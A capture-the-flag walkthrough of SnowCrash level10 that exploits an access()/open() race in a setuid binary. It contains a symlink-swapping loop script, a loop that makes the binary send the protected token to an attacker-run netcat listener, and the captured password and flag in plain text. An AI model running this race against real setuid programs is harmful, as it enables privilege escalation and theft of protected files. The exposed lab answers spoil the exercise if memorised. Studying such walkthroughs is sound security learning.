## Exploring the exercice

```bash 
$ ls -la
-rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
-rw-------  1 flag10  flag10     26 Mar  5  2016 token
```

We have a binary setuid and a token file with no rights for us. 
Let's do some tests

```bash 
$ ./level10 
./level10 file host
        sends file to host if you have access to it
```

The program seems to send a file to an address. 

```bash 
$ ./level10 token coucou
You don't have access to token
```

Okay let's ty with a file that we create

```bash 
$ echo 'salut' > /tmp/salut.txt
$ ./level10 /tmp/salut.txt level10
Connecting to level10:6969 .. Unable to connect to host level10
```

Okay no rights issue if it is our file. Let's look at the program with strings

```bash 
$  strings ./level10 
[...]
open
access
[...]
%s file host
	sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
```



The executable checks if we have the rights to read the file with the access function then tries to send it to a server and display its content but we do not have the necessary rights on the token file.


We learned more about 'access' and discovered the existence of  <a href='https://www.vpnunlimited.com/fr/help/cybersecurity/toctou-attack?srsltid=AfmBOoqehRSAC5_nVvLKZinLmwohL_LoSgNh-VZIJcej7_UG0dA6EeZg'>TOCTOU attacks</a>, wich is pretty well explained in the manual. It is exactly like race conditions in philosphers. 


```bash 
NOTES
Warning:  Using  access()  to  check  if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the short time interval between checking and opening the file to  manipulate  it.   For  this reason,  the use of this system call should be avoided.  (In the example just described, a safer alternative would be to temporarily switch the process's effective user ID to the real ID and then call open(2).)
```

What we want to do is that the access happens on a file where we have the rights and the open on the token.
To do so we will create in a loop a file, delete it and create a symbolic link to token. 

```bash 
$ cat symlink.sh
#!/bin/bash

while true; do
        touch /tmp/link
        rm -f /tmp/link
        ln -s /home/user/level10/token /tmp/link
        rm -f /tmp/link
done
```


Now in another program we will execute level10 excutable in a loop wih our file /tmp/link as an argument hoping that when the open is called it happens on the token. 


```bash 
$ cd /tmp
$ touch spam.sh
$ cat spam.sh
#!/bin/bash

while true; do
    /home/user/level10/level10 /tmp/link 192.168.1.75
done
```

We launch both our scripts in windows and we listen to the port 6969 (like we saw with strings that is where the output of level10 will be). 

```bash 
$ nc -lk 6969
[...]
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
^C
```


Let's try 
```bash
level10@SnowCrash:~$ su flag10
Password:
Don't forget to launch getflag !
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
````


